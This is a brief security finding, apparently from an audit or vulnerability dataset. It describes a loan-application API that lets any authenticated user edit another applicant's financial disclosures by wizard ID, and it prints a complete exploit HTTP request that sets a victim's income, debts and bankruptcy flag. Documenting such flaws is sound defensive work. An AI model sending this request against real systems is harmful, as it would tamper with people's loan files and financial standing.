diagnosis: The handler modifies financial disclosures on an active loan wizard session by wizard_id without verifying that session.applicant_id == current_user.id. Any authenticated user can modify income, debt obligations, or bankruptcy declarations on another applicant's pending loan file.
exploit_request:
PUT /api/v1/loans/wizard/wiz_loan_99184/step-financials HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"annual_income": 25000.0, "monthly_debt_obligations": 9000.0, "bankruptcy_declared": true}
